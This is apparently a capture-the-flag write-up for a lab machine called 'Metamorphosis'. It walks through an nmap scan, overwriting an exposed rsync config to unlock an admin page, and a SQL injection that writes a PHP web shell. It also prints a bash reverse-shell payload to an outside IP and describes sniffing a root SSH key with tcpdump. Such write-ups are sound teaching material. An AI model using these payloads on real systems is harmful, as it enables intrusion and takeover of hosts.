---
date: 2021-04-22 14:17:25
layout: post
title: "Metamorphosis"
subtitle:
description:
image: /writeup/assets/img/metamorphosis/main.jpg
optimized_image:
category:
tags:
author:
paginate: false
---

Start with nmap scan, you'll find several ports open.
```bash
nmap -T4 -p- -A 10.10.232.226

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 19:10 IST
Nmap scan report for 10.10.232.226
Host is up (0.42s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-04-22T13:40:34+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-22T13:40:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.29 seconds
```

Requesting the website hosted on port 80 gives default apache2 page and fuzzing the site for more directories and pages reveals `/admin/` directory which gives 403 Forbidden with a comment on the page.
![placeholder](/writeup/assets/img/metamorphosis/comment.png "Comment")

Moving on other ports, rsync is running on 873. Trying to connect to that shows that a directory **Confs** is located is present.
![placeholder](/writeup/assets/img/metamorphosis/rsync.png "Comment")

Copying all the contents of the directory to the local system with
```bash
rsync -av rsync://10.10.232.226/Conf ./
```
One of the file in the directory names webapp.ini looks suspicious as it contains a variable name env which might be regualting whether site runs in development mode or production mode as pointed by the comment earlier.
```ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```
Changing the variable value of **env** variable from **prod** to **dev** and then updating the directory on the remote server using rsync with
```bash
rsync -av ./ rsync://10.10.232.226/Conf
```
makes the `/admin` directory to give a different output than 403 Forbidden.
![placeholder](/writeup/assets/img/metamorphosis/unlocked.png "Admin")

Moreover, with further testing it reveals that the input text box is vulnerable to sql injection and can be used to drop a shell with
```
" UNION SELECT 1,"<?php system($_REQUEST['cmd']);?>",3 INTO OUTFILE "/var/www/html/cmd.php" -- ' 
```

Requesting the `http://10.10.232.226/cmd.php?whoami` shows that the reverse shell works.
![placeholder](/writeup/assets/img/metamorphosis/shell.png "Shell")

Using the following payload in the intercepted burpsuite request to the page gives reverse shell
```
bash+-c+'bash+-i+>%26+/dev/tcp/10.4.14.69/8888+0>%261'
```

>Reverse Shell can also be achieved automatically using sqlmap

Got the user.txt and can change to tom user using password as **password** and even if you don't change the user to tom then also things work same.

Moving forward, the tcpdump binary contains special permissions as visible from the command `getcap -r / 2>/dev/null`
![placeholder](/writeup/assets/img/metamorphosis/cap.png "Cap")

Since, tcpdump contains cap_net_raw permission, sninffing of network traffic is possible.

Running, `tcpdump -A -n -i 3` for some time gives us the private key for the root user.
![placeholder](/writeup/assets/img/metamorphosis/id_rsa.png "Key")

Copy and save the key to a file, change permission of the file `chmod 600 [name_of_file]` and then use it to ssh into root user `ssh -i [name_of_file] root@10.10.232.226`. 
